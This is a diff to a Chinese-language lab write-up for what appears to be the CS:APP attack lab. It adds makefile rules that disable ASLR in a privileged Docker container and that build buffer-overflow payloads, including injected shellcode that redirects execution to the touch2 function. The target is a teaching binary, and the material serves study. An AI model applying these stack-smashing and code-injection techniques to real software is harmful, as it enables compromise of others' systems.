@@ -17,6 +17,20 @@
 = 实验环境
 
 - 操作系统：Linux (Ubuntu 20.04 docker)
+
+  makefile 部分代码如下：
+  ```makefile
+  docker:
+    docker run --rm -it --privileged \
+      -v $(PWD):/lab -w /lab \
+      $(UBUNTU_IMAGE) /bin/bash -c "\
+        echo 0 > /proc/sys/kernel/randomize_va_space && \
+        apt update && \
+        DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
+        echo '>>> Environment ready! Entering shell...' && \
+        bash"
+  ```
+  经测试，宿主机archlinux同样可以直接运行实验代码，无需docker。
 - 编译器：gcc
 - 调试器：gdb
 - 反汇编工具：objdump
@@ -77,7 +91,11 @@ disas_ctarget:
 ```makefile
 level1: $(CTARGET) disas_ctarget
 	mkdir -p $(SRC)
-	echo "41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 d6 89 80 00 00 00 00 00" > $(SRC)/ctarget01.txt
+	rm -f $(SRC)/ctarget01.txt
+	for i in `seq 24`; do \
+		echo -n "41 " >> $(SRC)/ctarget01.txt; \
+	done
+	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
 	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
 	$(CTARGET) < $(OUT)/level1-raw
 ```
@@ -147,8 +165,71 @@ $1 = 0x5563e958
 
 于是我们注入的内容如下：
 ```
-[ shellcode: movl $cookie,%edi; ret ]  ; 6
-[ padding ]                            ; 18 (补齐 buf[0..23])
-[ new ret = buf 地址 ]                 ; 8
-[ 下一次 ret = touch2 地址 ]          ; 8
+[ shellcode:
+  movl $cookie,%edi;
+  pushq $(touch2_addr);
+  ret
+] + [ padding to fill buf ]
+[ new return address: buf_start_addr ]
 ```
+- 在运行到 `getbuf` 函数时，`rsp` 指向 `buf` 缓冲区的起始地址 `0x5563e958`。我们将 shellcode 写入 `buf`，然后覆盖返回地址为 `buf` 的起始地址，这样当 `getbuf` 函数返回时，就会跳转到我们注入的 shellcode 处执行。
+- shellcode 的第一条指令将 `cookie` 值加载到 `%edi` 寄存器中，作为 `touch2` 函数的第 1 个参数。
+- shellcode 的第二条指令将 `touch2` 函数的地址压入栈中，作为 `ret` 指令的返回地址。
+- 最后一条指令 `ret` 会弹出栈顶的地址并跳转到 `touch2` 函数。
+
+我们得到了最后的攻击输入：
+```txt
+[ shellcode in hex ] + [ padding ] + [ rsp address in little-endian ]
+```
+生成攻击输入的 makefile 代码如下：
+```makefile
+$(OUT)/level2_payload.s: cookie.txt
+	mkdir -p $(OUT)
+	echo "    .text" > $@
+	echo "    .globl _start" >> $@
+	echo "_start:" >> $@
+	echo "    movl $$ $(COOKIE), %edi" >> $@
+	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@
+	echo "    ret" >> $@
+
+$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
+	gcc -c $< -o $(OUT)/level2_payload.o
+	objdump -M intel -d $(OUT)/level2_payload.o > $@
+
+$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
+	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
+		for (i=2; i<=NF; i++) { \
+			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
+			else break; \
+		} \
+	} END { printf "\n"; }' > $@
+
+level2: $(OUT)/level2_payload.hex disas_ctarget
+	mkdir -p $(SRC)
+	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
+	for i in `seq 13`; do \
+		echo "41 " >> $(SRC)/ctarget02.txt; \
+	done
+	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
+	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
+	./ctarget < $(OUT)/level2-raw.txt
+```
+其中编写了汇编代码
+```asm
+    .text
+    .globl _start
+_start:
+    movl $<cookie>, %edi
+    pushq $<touch2_addr>
+    ret
+```
+执行 `make level2` 即可完成 Level 2 的攻击
+```txt
+Cookie: 0x********
+Type string:Touch2!: You called touch2(0x177c81f7)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+== Level 3: 防护机制绕过
